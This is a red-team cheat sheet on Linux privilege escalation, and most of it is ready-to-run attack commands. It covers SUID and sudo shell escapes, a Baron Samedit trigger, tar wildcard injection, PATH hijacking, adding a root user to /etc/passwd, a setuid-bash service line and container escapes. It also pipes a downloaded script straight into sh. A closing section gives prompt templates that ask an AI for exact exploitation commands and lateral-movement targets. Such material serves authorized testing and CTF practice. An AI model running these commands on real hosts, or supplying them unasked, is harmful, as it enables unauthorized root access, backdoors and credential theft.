---
id: "linux-privesc"
title: "Linux Privilege Escalation - Complete Methodology"
type: "technique"
category: "privilege-escalation"
subcategory: "linux"
tags: ["linux", "privesc", "suid", "sudo", "kernel", "capabilities", "cron", "path-hijack", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux"]
related: ["windows-privesc", "post-exploitation-persistence"]
updated: "2026-03-30"
---

## Overview

Linux privilege escalation is the process of gaining root or higher-privileged access from a low-privileged shell. In red team engagements and CTFs, initial access often lands you as a web user or service account — escalating to root is where the real impact begins.

## Automated Enumeration

Always start with automated enumeration scripts, then dig manually.

```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./linenum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh

# pspy (monitor processes without root)
./pspy64
```

## Kernel Exploits

```bash
# Check kernel version
uname -a
cat /etc/os-release

# Search for kernel exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Notable kernel exploits (2020-2026)
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 to 4.8
# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) - Ubuntu OverlayFS
# PwnKit (CVE-2021-4034) - Polkit pkexec, nearly universal
```

## SUID/SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check GTFOBins for exploitation
# https://gtfobins.github.io/

# Common SUID escalations
# /usr/bin/find with -exec
find . -exec /bin/sh -p \;

# /usr/bin/vim
vim -c ':!/bin/sh'

# /usr/bin/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/nmap (old versions with interactive)
nmap --interactive
!sh

# Custom SUID binary analysis
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary
```

## Sudo Misconfigurations

```bash
# Check sudo privileges
sudo -l

# Common escalation patterns:
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
!/bin/bash

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# (user:group) patterns - run as another user
sudo -u targetuser /allowed/binary

# Sudo version exploit (CVE-2021-3156 Baron Samedit)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# cap_setuid+ep on python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search (read any file)
# Use the binary to read /etc/shadow

# cap_net_raw (packet capture)
# Sniff credentials on the wire

# cap_sys_admin
# Mount filesystems, access host from container
```

## Cron Jobs & Scheduled Tasks

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /var/spool/cron/crontabs/

# Check systemd timers
systemctl list-timers --all

# Look for writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null

# Monitor for cron execution (use pspy)
./pspy64

# Wildcard injection in cron (tar with *)
# If cron runs: tar czf backup.tar.gz *
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```

## PATH Hijacking

```bash
# Check PATH
echo $PATH

# If a SUID binary or cron job calls a command without full path:
# 1. Create malicious binary with the same name
# 2. Put it earlier in PATH

echo '/bin/bash' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
export PATH=/tmp:$PATH
# Now run the SUID binary that calls 'vulnerable_command'
```

## Writable Files & Directories

```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# Writable /etc/passwd (add root user)
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Writable /etc/shadow (replace root hash)
# Writable service configs (systemd units, init scripts)
find /etc/systemd/ -writable 2>/dev/null

# Writable .service files
# Add ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
```

## Container Escapes

```bash
# Detect container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv

# Privileged container escape
fdisk -l  # if you can see host disks
mount /dev/sda1 /mnt
chroot /mnt

# Docker socket mounted
docker run -v /:/host -it alpine chroot /host

# CVE-2024-21626 (runc container escape)
# Overwrite /proc/self/exe via leaked fd
```

## Deep Dig Prompts

```
Given this LinPEAS/LinEnum output [paste]:
1. Identify the top 5 privilege escalation vectors ranked by reliability.
2. For each vector, provide the exact exploitation commands.
3. Identify any unusual services, cron jobs, or SUID binaries that suggest custom software.
4. Check for container indicators and suggest escape techniques.
5. Map any credential files or SSH keys that could enable lateral movement.
```

```
I have a shell as [user] on [distro + kernel version]:
1. Suggest kernel exploits for this exact version.
2. Check if PwnKit, DirtyPipe, or GameOver(lay) apply.
3. Recommend the safest (least likely to crash) escalation path.
```

## Tools

- **LinPEAS** — Comprehensive automated enumeration
- **LinEnum** — Scripted privilege escalation checks
- **linux-exploit-suggester** — Kernel exploit finder
- **pspy** — Process monitoring without root
- **GTFOBins** — Reference for SUID/sudo/capability abuse
- **Traitor** — Automated Linux privesc exploitation
